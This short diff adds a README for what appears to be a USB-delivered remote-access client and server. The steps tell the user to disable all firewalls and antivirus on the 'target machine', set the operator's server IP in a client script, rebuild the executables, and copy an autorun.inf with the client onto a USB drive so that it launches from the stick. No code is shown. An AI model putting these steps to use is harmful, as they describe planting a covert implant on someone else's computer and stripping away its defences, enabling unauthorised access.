@@ -1,0 +1,14 @@
+Disable all firewalls and antivirus on target machine.
+
+Copy your server ip address into codes/client2.py  variable IPAddr.
+
+Build it again using command "python setup.py build"
+
+Copy these files into usb:
+Codes/autorun.inf
+Executables/exe.win32-3.7/ * (all files except client.exe, server.exe)
+
+in case of new setup files copy these files into usb.
+build/exe.win32-3.7/ * (all files except client.exe, server.exe)
+
+client.exe should be in same directory as autorun.inf
